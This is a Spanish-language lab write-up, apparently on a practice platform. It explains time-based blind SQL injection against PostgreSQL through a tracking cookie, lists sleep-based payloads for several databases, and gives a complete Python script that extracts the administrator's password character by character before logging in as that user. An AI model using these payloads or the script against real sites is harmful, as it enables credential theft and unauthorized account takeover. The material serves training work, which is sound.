![[Pasted image 20250728151904.png]]
## Conditional time delays

You can test a single boolean condition and trigger a time delay if the condition is true.

|   |   |
|---|---|
|Oracle|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`|
|Microsoft|`IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`|
|MySQL|`SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`|
### Conocer la existencia del usuario administrador
****
Consulta basada en tiempo para averiguar la existencia de un usuario PostgreSQL: `'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- -`

En caso de que la web tarde 5 segundos en responder, significa que el usuario `administrator` existe.

![[Pasted image 20250728153042.png]]
![[Pasted image 20250728153100.png]]
![[Pasted image 20250728153115.png]]
### Conocer la longitud de la contraseña de administrator
****
Una vez que conocemos la existencia del usuario `administrator` debemos conocer la longitud de la contraseña del mismo. Lo haremos de la misma forma que anteriormente.

Consulta basada en tiempo para conocer la longitud de la contraseña de un usuario PostgreSQL: `'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND LENGTH(password) > 19)-- -`

![[Pasted image 20250728154606.png]]
![[Pasted image 20250728154540.png]]
![[Pasted image 20250728154627.png]]

Veamos si la contraseña posee más de 20 caracteres.

![[Pasted image 20250728154908.png]]
![[Pasted image 20250728154627.png]]

La contraseña del usuario `administrator` tiene más de 19 carcteres pero no tiene más de 20, por lo tanto la longitud de la misma es de 20.
### Fuzzear los caracteres de la contraseña
****
Una vez conociendo que la longitud de la contraseña del usuario `administrator` es 20. Con la misma base que utilizamos para averiguar la longitud, averiguaremos cada uno de los caracteres de la contraseña.
## Substring

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

|   |   |
|---|---|
|Oracle|`SUBSTR('foobar', 4, 2)`|
|Microsoft|`SUBSTRING('foobar', 4, 2)`|
|PostgreSQL|`SUBSTRING('foobar', 4, 2)`|
|MySQL|`SUBSTRING('foobar', 4, 2)`|

Consulta basada en tiempo para fuzzear la contraseña de un usuario PostgreSQL: `'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='a')-- -`

Si el primer caracter de la contraseña de `administrator` es una "a", la web tardará en responder 5 segundos.

## Código del Script

```python
#!/usr/bin/env python3
from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

#ctrl + C
signal.signal(signal.SIGINT, def_handler)

page_url = input("Ingrese la url: ")
caracteres = str(string.digits + string.ascii_lowercase + string.ascii_uppercase) #todos los caracteres
cookie = input("Ingrese la cookie: ")
sessionHash = input("Ingrese el hash de session: ")

def makeRequest():
    password = ''

    p1 = log.progress("")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    progressPass = log.progress('Password')

    for posicion in range(1,21): #1..20
        for caracter in caracteres:
            cookies = {
                'TrackingId': "%s'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND SUBSTRING(password,%d,1)='%s')-- -" % (cookie,posicion,caracter),
                'session': sessionHash
            }

            time_start = time.time()

            r=requests.get(url=page_url, cookies=cookies)
            
            time_end = time.time()

            if time_end - time_start >= 3: # Tiempo de espera mayor o igual a 3, caracter correcto
                password += caracter
                progressPass.status(password)
                break


if __name__ == '__main__':
    makeRequest()
```

## Análisis del Código

### Técnica utilizada: Time-Based Blind SQL Injection

Este script implementa una técnica de **blind SQL injection basada en tiempo**. En lugar de buscar contenido específico o generar errores, **mide el tiempo de respuesta** del servidor para determinar si una condición es verdadera o falsa.

### Payload SQL utilizado

```sql
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND SUBSTRING(password,POSICION,1)='CARACTER')-- -
```

### Desglose del payload

#### 1. **Operador de concatenación `||`**

```sql
'||
```

- Conecta la cookie original con la inyección SQL
- Compatible con PostgreSQL y Oracle
#### 2. **Estructura CASE WHEN con funciones de tiempo**

```sql
(SELECT CASE WHEN (condición) THEN pg_sleep(3) ELSE pg_sleep(0) END ...)
```

- **CASE WHEN**: Estructura condicional
- **THEN pg_sleep(3)**: Si es TRUE → pausa la ejecución 3 segundos
- **ELSE pg_sleep(0)**: Si es FALSE → no hay pausa (0 segundos)

#### 3. **Función específica para PostgreSQL**

```sql
pg_sleep(3)
```

- **pg_sleep()**: Función específica de PostgreSQL
- Pausa la ejecución de la consulta por el número de segundos especificado
- Equivalencias en otras bases de datos:
    - **MySQL**: `SLEEP(3)`
    - **Oracle**: `DBMS_LOCK.SLEEP(3)`
    - **SQL Server**: `WAITFOR DELAY '00:00:03'`

#### 4. **Condición de verificación**

```sql
FROM users WHERE username='administrator' AND SUBSTRING(password,POSICION,1)='CARACTER'
```

- **SUBSTRING()**: Función estándar SQL (vs `SUBSTR` de Oracle)
- Extrae 1 caracter en la posición especificada
- Verifica si coincide con el caracter que estamos probando

### Medición de tiempo de respuesta

```python
time_start = time.time()
r=requests.get(url=page_url, cookies=cookies)
time_end = time.time()

if time_end - time_start >= 3: # Tiempo de espera mayor o igual a 3, caracter correcto
    password += caracter
    progressPass.status(password)
    break
```

#### Funcionamiento de la detección temporal

**Escenario 1: Caracter correcto**

1. `SUBSTRING(password,1,1)='a'` es **TRUE** (asumiendo que 'a' es correcto)
2. Se ejecuta `pg_sleep(3)` → **Pausa de 3 segundos**
3. El tiempo total de respuesta es ≥ 3 segundos
4. El script confirma que el caracter es correcto

**Escenario 2: Caracter incorrecto**

1. `SUBSTRING(password,1,1)='z'` es **FALSE** (asumiendo que 'z' es incorrecto)
2. Se ejecuta `pg_sleep(0)` → **Sin pausa**
3. El tiempo de respuesta es normal (< 3 segundos)
4. El script continúa con el siguiente caracter

![[Pasted image 20250728171415.png]]
### Loguearnos como el usuario administrador
****
![[Pasted image 20250728171531.png]]
![[Pasted image 20250728171604.png]]